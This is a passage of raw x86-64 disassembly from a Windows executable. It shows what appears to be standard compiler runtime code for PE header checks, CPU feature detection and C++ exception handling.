   140001736:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000173a:	e8 b1 c6 00 00       	call   0x14000ddf0
   14000173f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001744:	ff 15 1e d9 00 00    	call   *0xd91e(%rip)        # 0x14000f068
   14000174a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000174f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140001754:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000175a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140001761:	c3                   	ret
   140001762:	cc                   	int3
   140001763:	cc                   	int3
   140001764:	e9 fb fd ff ff       	jmp    0x140001564
   140001769:	cc                   	int3
   14000176a:	cc                   	int3
   14000176b:	cc                   	int3
   14000176c:	48 83 ec 28          	sub    $0x28,%rsp
   140001770:	33 c9                	xor    %ecx,%ecx
   140001772:	ff 15 00 d9 00 00    	call   *0xd900(%rip)        # 0x14000f078
   140001778:	48 85 c0             	test   %rax,%rax
   14000177b:	74 39                	je     0x1400017b6
   14000177d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140001782:	66 39 08             	cmp    %cx,(%rax)
   140001785:	75 2f                	jne    0x1400017b6
   140001787:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000178b:	48 03 c8             	add    %rax,%rcx
   14000178e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001794:	75 20                	jne    0x1400017b6
   140001796:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000179b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   14000179f:	75 15                	jne    0x1400017b6
   1400017a1:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1400017a8:	76 0c                	jbe    0x1400017b6
   1400017aa:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   1400017b1:	0f 95 c0             	setne  %al
   1400017b4:	eb 02                	jmp    0x1400017b8
   1400017b6:	32 c0                	xor    %al,%al
   1400017b8:	48 83 c4 28          	add    $0x28,%rsp
   1400017bc:	c3                   	ret
   1400017bd:	cc                   	int3
   1400017be:	cc                   	int3
   1400017bf:	cc                   	int3
   1400017c0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400017d0
   1400017c7:	48 ff 25 92 d8 00 00 	rex.W jmp *0xd892(%rip)        # 0x14000f060
   1400017ce:	cc                   	int3
   1400017cf:	cc                   	int3
   1400017d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017d5:	57                   	push   %rdi
   1400017d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400017da:	48 8b 19             	mov    (%rcx),%rbx
   1400017dd:	48 8b f9             	mov    %rcx,%rdi
   1400017e0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400017e6:	75 1c                	jne    0x140001804
   1400017e8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400017ec:	75 16                	jne    0x140001804
   1400017ee:	8b 53 20             	mov    0x20(%rbx),%edx
   1400017f1:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   1400017f7:	83 f8 02             	cmp    $0x2,%eax
   1400017fa:	76 15                	jbe    0x140001811
   1400017fc:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140001802:	74 0d                	je     0x140001811
   140001804:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001809:	33 c0                	xor    %eax,%eax
   14000180b:	48 83 c4 20          	add    $0x20,%rsp
   14000180f:	5f                   	pop    %rdi
   140001810:	c3                   	ret
   140001811:	e8 fe 05 00 00       	call   0x140001e14
   140001816:	48 89 18             	mov    %rbx,(%rax)
   140001819:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000181d:	e8 06 06 00 00       	call   0x140001e28
   140001822:	48 89 18             	mov    %rbx,(%rax)
   140001825:	e8 b6 4c 00 00       	call   0x1400064e0
   14000182a:	cc                   	int3
   14000182b:	cc                   	int3
   14000182c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001831:	57                   	push   %rdi
   140001832:	48 83 ec 20          	sub    $0x20,%rsp
   140001836:	48 8d 1d 4b 59 01 00 	lea    0x1594b(%rip),%rbx        # 0x140017188
   14000183d:	48 8d 3d 44 59 01 00 	lea    0x15944(%rip),%rdi        # 0x140017188
   140001844:	eb 12                	jmp    0x140001858
   140001846:	48 8b 03             	mov    (%rbx),%rax
   140001849:	48 85 c0             	test   %rax,%rax
   14000184c:	74 06                	je     0x140001854
   14000184e:	ff 15 0c da 00 00    	call   *0xda0c(%rip)        # 0x14000f260
   140001854:	48 83 c3 08          	add    $0x8,%rbx
   140001858:	48 3b df             	cmp    %rdi,%rbx
   14000185b:	72 e9                	jb     0x140001846
   14000185d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001862:	48 83 c4 20          	add    $0x20,%rsp
   140001866:	5f                   	pop    %rdi
   140001867:	c3                   	ret
   140001868:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000186d:	57                   	push   %rdi
   14000186e:	48 83 ec 20          	sub    $0x20,%rsp
   140001872:	48 8d 1d 1f 59 01 00 	lea    0x1591f(%rip),%rbx        # 0x140017198
   140001879:	48 8d 3d 18 59 01 00 	lea    0x15918(%rip),%rdi        # 0x140017198
   140001880:	eb 12                	jmp    0x140001894
   140001882:	48 8b 03             	mov    (%rbx),%rax
   140001885:	48 85 c0             	test   %rax,%rax
   140001888:	74 06                	je     0x140001890
   14000188a:	ff 15 d0 d9 00 00    	call   *0xd9d0(%rip)        # 0x14000f260
   140001890:	48 83 c3 08          	add    $0x8,%rbx
   140001894:	48 3b df             	cmp    %rdi,%rbx
   140001897:	72 e9                	jb     0x140001882
   140001899:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000189e:	48 83 c4 20          	add    $0x20,%rsp
   1400018a2:	5f                   	pop    %rdi
   1400018a3:	c3                   	ret
   1400018a4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400018a9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400018ae:	57                   	push   %rdi
   1400018af:	48 83 ec 10          	sub    $0x10,%rsp
   1400018b3:	33 c0                	xor    %eax,%eax
   1400018b5:	33 c9                	xor    %ecx,%ecx
   1400018b7:	0f a2                	cpuid
   1400018b9:	44 8b c1             	mov    %ecx,%r8d
   1400018bc:	45 33 db             	xor    %r11d,%r11d
   1400018bf:	44 8b d2             	mov    %edx,%r10d
   1400018c2:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   1400018c9:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   1400018d0:	44 8b cb             	mov    %ebx,%r9d
   1400018d3:	8b f0                	mov    %eax,%esi
   1400018d5:	33 c9                	xor    %ecx,%ecx
   1400018d7:	41 8d 43 01          	lea    0x1(%r11),%eax
   1400018db:	45 0b d0             	or     %r8d,%r10d
   1400018de:	0f a2                	cpuid
   1400018e0:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   1400018e7:	89 04 24             	mov    %eax,(%rsp)
   1400018ea:	45 0b d1             	or     %r9d,%r10d
   1400018ed:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   1400018f1:	8b f9                	mov    %ecx,%edi
   1400018f3:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400018f7:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   1400018fb:	75 5b                	jne    0x140001958
   1400018fd:	48 83 0d 23 77 01 00 	orq    $0xffffffffffffffff,0x17723(%rip)        # 0x140019028
   140001904:	ff 
   140001905:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   14000190a:	48 c7 05 0b 77 01 00 	movq   $0x8000,0x1770b(%rip)        # 0x140019020
   140001911:	00 80 00 00 
   140001915:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000191a:	74 28                	je     0x140001944
   14000191c:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140001921:	74 21                	je     0x140001944
   140001923:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140001928:	74 1a                	je     0x140001944
   14000192a:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   14000192f:	83 f8 20             	cmp    $0x20,%eax
   140001932:	77 24                	ja     0x140001958
   140001934:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000193b:	00 00 00 
   14000193e:	48 0f a3 c1          	bt     %rax,%rcx
   140001942:	73 14                	jae    0x140001958
   140001944:	44 8b 05 f9 81 01 00 	mov    0x181f9(%rip),%r8d        # 0x140019b44
   14000194b:	41 83 c8 01          	or     $0x1,%r8d
   14000194f:	44 89 05 ee 81 01 00 	mov    %r8d,0x181ee(%rip)        # 0x140019b44
   140001956:	eb 07                	jmp    0x14000195f
   140001958:	44 8b 05 e5 81 01 00 	mov    0x181e5(%rip),%r8d        # 0x140019b44
   14000195f:	b8 07 00 00 00       	mov    $0x7,%eax
   140001964:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   140001968:	3b f0                	cmp    %eax,%esi
   14000196a:	7c 26                	jl     0x140001992
   14000196c:	33 c9                	xor    %ecx,%ecx
   14000196e:	0f a2                	cpuid
   140001970:	89 04 24             	mov    %eax,(%rsp)
   140001973:	44 8b db             	mov    %ebx,%r11d
   140001976:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000197a:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000197e:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140001982:	0f ba e3 09          	bt     $0x9,%ebx
   140001986:	73 0a                	jae    0x140001992
   140001988:	45 0b c1             	or     %r9d,%r8d
   14000198b:	44 89 05 b2 81 01 00 	mov    %r8d,0x181b2(%rip)        # 0x140019b44
   140001992:	c7 05 7c 76 01 00 01 	movl   $0x1,0x1767c(%rip)        # 0x140019018
   140001999:	00 00 00 
   14000199c:	44 89 0d 79 76 01 00 	mov    %r9d,0x17679(%rip)        # 0x14001901c
   1400019a3:	0f ba e7 14          	bt     $0x14,%edi
   1400019a7:	0f 83 91 00 00 00    	jae    0x140001a3e
   1400019ad:	44 89 0d 64 76 01 00 	mov    %r9d,0x17664(%rip)        # 0x140019018
   1400019b4:	bb 06 00 00 00       	mov    $0x6,%ebx
   1400019b9:	89 1d 5d 76 01 00    	mov    %ebx,0x1765d(%rip)        # 0x14001901c
   1400019bf:	0f ba e7 1b          	bt     $0x1b,%edi
   1400019c3:	73 79                	jae    0x140001a3e
   1400019c5:	0f ba e7 1c          	bt     $0x1c,%edi
   1400019c9:	73 73                	jae    0x140001a3e
   1400019cb:	33 c9                	xor    %ecx,%ecx
   1400019cd:	0f 01 d0             	xgetbv
   1400019d0:	48 c1 e2 20          	shl    $0x20,%rdx
   1400019d4:	48 0b d0             	or     %rax,%rdx
   1400019d7:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400019dc:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400019e1:	22 c3                	and    %bl,%al
   1400019e3:	3a c3                	cmp    %bl,%al
   1400019e5:	75 57                	jne    0x140001a3e
   1400019e7:	8b 05 2f 76 01 00    	mov    0x1762f(%rip),%eax        # 0x14001901c
   1400019ed:	83 c8 08             	or     $0x8,%eax
   1400019f0:	c7 05 1e 76 01 00 03 	movl   $0x3,0x1761e(%rip)        # 0x140019018
   1400019f7:	00 00 00 
   1400019fa:	89 05 1c 76 01 00    	mov    %eax,0x1761c(%rip)        # 0x14001901c
   140001a00:	41 f6 c3 20          	test   $0x20,%r11b
   140001a04:	74 38                	je     0x140001a3e
   140001a06:	83 c8 20             	or     $0x20,%eax
   140001a09:	c7 05 05 76 01 00 05 	movl   $0x5,0x17605(%rip)        # 0x140019018
   140001a10:	00 00 00 
   140001a13:	89 05 03 76 01 00    	mov    %eax,0x17603(%rip)        # 0x14001901c
   140001a19:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   140001a1e:	44 23 d8             	and    %eax,%r11d
   140001a21:	44 3b d8             	cmp    %eax,%r11d
   140001a24:	75 18                	jne    0x140001a3e
   140001a26:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001a2b:	24 e0                	and    $0xe0,%al
   140001a2d:	3c e0                	cmp    $0xe0,%al
   140001a2f:	75 0d                	jne    0x140001a3e
   140001a31:	83 0d e4 75 01 00 40 	orl    $0x40,0x175e4(%rip)        # 0x14001901c
   140001a38:	89 1d da 75 01 00    	mov    %ebx,0x175da(%rip)        # 0x140019018
   140001a3e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140001a43:	33 c0                	xor    %eax,%eax
   140001a45:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140001a4a:	48 83 c4 10          	add    $0x10,%rsp
   140001a4e:	5f                   	pop    %rdi
   140001a4f:	c3                   	ret
   140001a50:	33 c0                	xor    %eax,%eax
   140001a52:	39 05 08 93 01 00    	cmp    %eax,0x19308(%rip)        # 0x14001ad60
   140001a58:	0f 95 c0             	setne  %al
   140001a5b:	c3                   	ret
   140001a5c:	cc                   	int3
   140001a5d:	cc                   	int3
   140001a5e:	cc                   	int3
   140001a5f:	cc                   	int3
   140001a60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a65:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140001a6a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001a6f:	57                   	push   %rdi
   140001a70:	41 54                	push   %r12
   140001a72:	41 55                	push   %r13
   140001a74:	41 56                	push   %r14
   140001a76:	41 57                	push   %r15
   140001a78:	48 83 ec 40          	sub    $0x40,%rsp
   140001a7c:	48 8b f1             	mov    %rcx,%rsi
   140001a7f:	4d 8b f9             	mov    %r9,%r15
   140001a82:	49 8b c8             	mov    %r8,%rcx
   140001a85:	49 8b e8             	mov    %r8,%rbp
   140001a88:	4c 8b ea             	mov    %rdx,%r13
   140001a8b:	e8 24 04 00 00       	call   0x140001eb4
   140001a90:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140001a94:	4d 8b 37             	mov    (%r15),%r14
   140001a97:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   140001a9b:	4d 2b f4             	sub    %r12,%r14
   140001a9e:	f6 46 04 66          	testb  $0x66,0x4(%rsi)
   140001aa2:	41 8b 7f 48          	mov    0x48(%r15),%edi
   140001aa6:	0f 85 f1 00 00 00    	jne    0x140001b9d
   140001aac:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001ab1:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140001ab6:	e9 ce 00 00 00       	jmp    0x140001b89
   140001abb:	8b cf                	mov    %edi,%ecx
   140001abd:	48 03 c9             	add    %rcx,%rcx
   140001ac0:	8b ef                	mov    %edi,%ebp
   140001ac2:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140001ac6:	4c 3b f0             	cmp    %rax,%r14
   140001ac9:	0f 82 b8 00 00 00    	jb     0x140001b87
   140001acf:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140001ad3:	4c 3b f0             	cmp    %rax,%r14
   140001ad6:	0f 83 ab 00 00 00    	jae    0x140001b87
   140001adc:	83 7c cb 10 00       	cmpl   $0x0,0x10(%rbx,%rcx,8)
   140001ae1:	0f 84 a0 00 00 00    	je     0x140001b87
   140001ae7:	83 7c cb 0c 01       	cmpl   $0x1,0xc(%rbx,%rcx,8)
   140001aec:	74 1b                	je     0x140001b09
   140001aee:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   140001af2:	49 8b d5             	mov    %r13,%rdx
   140001af5:	49 03 c4             	add    %r12,%rax
   140001af8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001afd:	ff d0                	call   *%rax
   140001aff:	85 c0                	test   %eax,%eax
   140001b01:	0f 88 8f 00 00 00    	js     0x140001b96
   140001b07:	7e 7e                	jle    0x140001b87
   140001b09:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   140001b0f:	75 28                	jne    0x140001b39
   140001b11:	48 83 3d 37 d8 00 00 	cmpq   $0x0,0xd837(%rip)        # 0x14000f350
   140001b18:	00 
   140001b19:	74 1e                	je     0x140001b39
   140001b1b:	48 8d 0d 2e d8 00 00 	lea    0xd82e(%rip),%rcx        # 0x14000f350
   140001b22:	e8 29 be 00 00       	call   0x14000d950
   140001b27:	85 c0                	test   %eax,%eax
   140001b29:	74 0e                	je     0x140001b39
   140001b2b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001b30:	48 8b ce             	mov    %rsi,%rcx
   140001b33:	ff 15 17 d8 00 00    	call   *0xd817(%rip)        # 0x14000f350
   140001b39:	48 8d 45 01          	lea    0x1(%rbp),%rax
   140001b3d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001b43:	48 03 c0             	add    %rax,%rax
   140001b46:	49 8b d5             	mov    %r13,%rdx
   140001b49:	8b 0c c3             	mov    (%rbx,%rax,8),%ecx
   140001b4c:	49 03 cc             	add    %r12,%rcx
   140001b4f:	e8 2c 03 00 00       	call   0x140001e80
   140001b54:	44 8b 0e             	mov    (%rsi),%r9d
   140001b57:	48 8d 45 01          	lea    0x1(%rbp),%rax
   140001b5b:	48 03 c0             	add    %rax,%rax
   140001b5e:	4c 8b c6             	mov    %rsi,%r8
   140001b61:	49 8b cd             	mov    %r13,%rcx
   140001b64:	8b 14 c3             	mov    (%rbx,%rax,8),%edx
   140001b67:	49 8b 47 40          	mov    0x40(%r15),%rax
   140001b6b:	49 03 d4             	add    %r12,%rdx
   140001b6e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001b73:	49 8b 47 28          	mov    0x28(%r15),%rax
   140001b77:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001b7c:	ff 15 06 d5 00 00    	call   *0xd506(%rip)        # 0x14000f088
   140001b82:	e8 29 03 00 00       	call   0x140001eb0
   140001b87:	ff c7                	inc    %edi
   140001b89:	3b 3b                	cmp    (%rbx),%edi
   140001b8b:	0f 82 2a ff ff ff    	jb     0x140001abb
   140001b91:	e9 be 00 00 00       	jmp    0x140001c54
   140001b96:	33 c0                	xor    %eax,%eax
   140001b98:	e9 bc 00 00 00       	jmp    0x140001c59
   140001b9d:	49 8b 6f 20          	mov    0x20(%r15),%rbp
   140001ba1:	49 2b ec             	sub    %r12,%rbp
   140001ba4:	e9 9f 00 00 00       	jmp    0x140001c48
   140001ba9:	44 8b cf             	mov    %edi,%r9d
   140001bac:	4d 03 c9             	add    %r9,%r9
   140001baf:	42 8b 44 cb 04       	mov    0x4(%rbx,%r9,8),%eax
   140001bb4:	4c 3b f0             	cmp    %rax,%r14
   140001bb7:	0f 82 89 00 00 00    	jb     0x140001c46
   140001bbd:	42 8b 44 cb 08       	mov    0x8(%rbx,%r9,8),%eax
   140001bc2:	4c 3b f0             	cmp    %rax,%r14
   140001bc5:	73 7f                	jae    0x140001c46
   140001bc7:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140001bcb:	74 3f                	je     0x140001c0c
   140001bcd:	33 d2                	xor    %edx,%edx
   140001bcf:	45 85 c0             	test   %r8d,%r8d
   140001bd2:	74 34                	je     0x140001c08
   140001bd4:	8b ca                	mov    %edx,%ecx
   140001bd6:	48 03 c9             	add    %rcx,%rcx
   140001bd9:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140001bdd:	48 3b e8             	cmp    %rax,%rbp
   140001be0:	72 1f                	jb     0x140001c01
   140001be2:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140001be6:	48 3b e8             	cmp    %rax,%rbp
   140001be9:	73 16                	jae    0x140001c01
   140001beb:	42 8b 44 cb 10       	mov    0x10(%rbx,%r9,8),%eax
   140001bf0:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   140001bf4:	75 0b                	jne    0x140001c01
   140001bf6:	42 8b 44 cb 0c       	mov    0xc(%rbx,%r9,8),%eax
   140001bfb:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   140001bff:	74 07                	je     0x140001c08
   140001c01:	ff c2                	inc    %edx
   140001c03:	41 3b d0             	cmp    %r8d,%edx
   140001c06:	72 cc                	jb     0x140001bd4
   140001c08:	3b 13                	cmp    (%rbx),%edx
   140001c0a:	75 48                	jne    0x140001c54
   140001c0c:	8b c7                	mov    %edi,%eax
   140001c0e:	48 ff c0             	inc    %rax
   140001c11:	8b cf                	mov    %edi,%ecx
   140001c13:	48 03 c0             	add    %rax,%rax
   140001c16:	48 03 c9             	add    %rcx,%rcx
   140001c19:	83 3c c3 00          	cmpl   $0x0,(%rbx,%rax,8)
   140001c1d:	74 10                	je     0x140001c2f
   140001c1f:	8b 04 c3             	mov    (%rbx,%rax,8),%eax
   140001c22:	48 3b e8             	cmp    %rax,%rbp
   140001c25:	75 1f                	jne    0x140001c46
   140001c27:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140001c2b:	75 27                	jne    0x140001c54
   140001c2d:	eb 17                	jmp    0x140001c46
   140001c2f:	8d 47 01             	lea    0x1(%rdi),%eax
   140001c32:	49 8b d5             	mov    %r13,%rdx
   140001c35:	41 89 47 48          	mov    %eax,0x48(%r15)
   140001c39:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140001c3e:	b1 01                	mov    $0x1,%cl
   140001c40:	4d 03 c4             	add    %r12,%r8
   140001c43:	41 ff d0             	call   *%r8
   140001c46:	ff c7                	inc    %edi
   140001c48:	44 8b 03             	mov    (%rbx),%r8d
   140001c4b:	41 3b f8             	cmp    %r8d,%edi
   140001c4e:	0f 82 55 ff ff ff    	jb     0x140001ba9
   140001c54:	b8 01 00 00 00       	mov    $0x1,%eax
   140001c59:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140001c5e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140001c62:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140001c66:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140001c6a:	49 8b e3             	mov    %r11,%rsp
   140001c6d:	41 5f                	pop    %r15
   140001c6f:	41 5e                	pop    %r14
   140001c71:	41 5d                	pop    %r13
   140001c73:	41 5c                	pop    %r12
   140001c75:	5f                   	pop    %rdi
   140001c76:	c3                   	ret
   140001c77:	cc                   	int3
   140001c78:	48 83 ec 28          	sub    $0x28,%rsp
   140001c7c:	e8 d3 03 00 00       	call   0x140002054
   140001c81:	84 c0                	test   %al,%al
   140001c83:	75 04                	jne    0x140001c89
   140001c85:	32 c0                	xor    %al,%al
   140001c87:	eb 12                	jmp    0x140001c9b
   140001c89:	e8 5a 03 00 00       	call   0x140001fe8
   140001c8e:	84 c0                	test   %al,%al
   140001c90:	75 07                	jne    0x140001c99
   140001c92:	e8 05 04 00 00       	call   0x14000209c
   140001c97:	eb ec                	jmp    0x140001c85
   140001c99:	b0 01                	mov    $0x1,%al
   140001c9b:	48 83 c4 28          	add    $0x28,%rsp
   140001c9f:	c3                   	ret
   140001ca0:	48 83 ec 28          	sub    $0x28,%rsp
   140001ca4:	84 c9                	test   %cl,%cl
   140001ca6:	75 0a                	jne    0x140001cb2
   140001ca8:	e8 83 03 00 00       	call   0x140002030
   140001cad:	e8 ea 03 00 00       	call   0x14000209c
   140001cb2:	b0 01                	mov    $0x1,%al
   140001cb4:	48 83 c4 28          	add    $0x28,%rsp
   140001cb8:	c3                   	ret
   140001cb9:	cc                   	int3
   140001cba:	cc                   	int3
   140001cbb:	cc                   	int3
   140001cbc:	48 3b ca             	cmp    %rdx,%rcx
   140001cbf:	74 19                	je     0x140001cda
   140001cc1:	48 83 c2 09          	add    $0x9,%rdx
   140001cc5:	48 8d 41 09          	lea    0x9(%rcx),%rax
   140001cc9:	48 2b d0             	sub    %rax,%rdx
   140001ccc:	8a 08                	mov    (%rax),%cl
   140001cce:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   140001cd1:	75 0a                	jne    0x140001cdd
   140001cd3:	48 ff c0             	inc    %rax
   140001cd6:	84 c9                	test   %cl,%cl
   140001cd8:	75 f2                	jne    0x140001ccc
   140001cda:	33 c0                	xor    %eax,%eax
   140001cdc:	c3                   	ret
   140001cdd:	1b c0                	sbb    %eax,%eax
   140001cdf:	83 c8 01             	or     $0x1,%eax
   140001ce2:	c3                   	ret
   140001ce3:	cc                   	int3
   140001ce4:	48 85 c9             	test   %rcx,%rcx
   140001ce7:	74 67                	je     0x140001d50
   140001ce9:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140001ced:	48 83 ec 48          	sub    $0x48,%rsp
   140001cf1:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140001cf7:	75 53                	jne    0x140001d4c
   140001cf9:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140001cfd:	75 4d                	jne    0x140001d4c
   140001cff:	8b 41 20             	mov    0x20(%rcx),%eax
   140001d02:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140001d07:	83 f8 02             	cmp    $0x2,%eax
   140001d0a:	77 40                	ja     0x140001d4c
   140001d0c:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140001d10:	48 85 c0             	test   %rax,%rax
   140001d13:	74 37                	je     0x140001d4c
   140001d15:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140001d19:	85 d2                	test   %edx,%edx
   140001d1b:	74 11                	je     0x140001d2e
   140001d1d:	48 03 51 38          	add    0x38(%rcx),%rdx
   140001d21:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140001d25:	e8 2a 00 00 00       	call   0x140001d54
   140001d2a:	eb 20                	jmp    0x140001d4c
   140001d2c:	eb 1e                	jmp    0x140001d4c
   140001d2e:	f6 00 10             	testb  $0x10,(%rax)
   140001d31:	74 19                	je     0x140001d4c
   140001d33:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140001d37:	48 8b 08             	mov    (%rax),%rcx
   140001d3a:	48 85 c9             	test   %rcx,%rcx
   140001d3d:	74 0d                	je     0x140001d4c
   140001d3f:	48 8b 01             	mov    (%rcx),%rax
   140001d42:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001d46:	ff 15 14 d5 00 00    	call   *0xd514(%rip)        # 0x14000f260
   140001d4c:	48 83 c4 48          	add    $0x48,%rsp
   140001d50:	c3                   	ret
   140001d51:	cc                   	int3
   140001d52:	cc                   	int3
   140001d53:	cc                   	int3
   140001d54:	48 ff e2             	rex.W jmp *%rdx
   140001d57:	cc                   	int3
   140001d58:	40 53                	rex push %rbx
   140001d5a:	48 83 ec 20          	sub    $0x20,%rsp
   140001d5e:	48 8b d9             	mov    %rcx,%rbx
   140001d61:	e8 a6 01 00 00       	call   0x140001f0c
   140001d66:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140001d6a:	eb 09                	jmp    0x140001d75
   140001d6c:	48 39 1a             	cmp    %rbx,(%rdx)
   140001d6f:	74 12                	je     0x140001d83
   140001d71:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140001d75:	48 85 d2             	test   %rdx,%rdx
   140001d78:	75 f2                	jne    0x140001d6c
   140001d7a:	8d 42 01             	lea    0x1(%rdx),%eax
   140001d7d:	48 83 c4 20          	add    $0x20,%rsp
   140001d81:	5b                   	pop    %rbx
   140001d82:	c3                   	ret
   140001d83:	33 c0                	xor    %eax,%eax
   140001d85:	eb f6                	jmp    0x140001d7d
   140001d87:	cc                   	int3
   140001d88:	48 63 02             	movslq (%rdx),%rax
   140001d8b:	48 03 c1             	add    %rcx,%rax
   140001d8e:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   140001d92:	7c 16                	jl     0x140001daa
   140001d94:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   140001d98:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   140001d9c:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   140001da0:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   140001da4:	4d 03 c1             	add    %r9,%r8
   140001da7:	49 03 c0             	add    %r8,%rax
   140001daa:	c3                   	ret
   140001dab:	cc                   	int3
   140001dac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001db1:	57                   	push   %rdi
   140001db2:	48 83 ec 20          	sub    $0x20,%rsp
   140001db6:	48 8b 39             	mov    (%rcx),%rdi
   140001db9:	48 8b d9             	mov    %rcx,%rbx
   140001dbc:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   140001dc2:	74 12                	je     0x140001dd6
   140001dc4:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   140001dca:	74 0a                	je     0x140001dd6
   140001dcc:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140001dd2:	74 22                	je     0x140001df6
   140001dd4:	eb 13                	jmp    0x140001de9
   140001dd6:	e8 31 01 00 00       	call   0x140001f0c
   140001ddb:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140001ddf:	7e 08                	jle    0x140001de9
   140001de1:	e8 26 01 00 00       	call   0x140001f0c
   140001de6:	ff 48 30             	decl   0x30(%rax)
   140001de9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001dee:	33 c0                	xor    %eax,%eax
   140001df0:	48 83 c4 20          	add    $0x20,%rsp
   140001df4:	5f                   	pop    %rdi
   140001df5:	c3                   	ret
   140001df6:	e8 11 01 00 00       	call   0x140001f0c
   140001dfb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140001dff:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
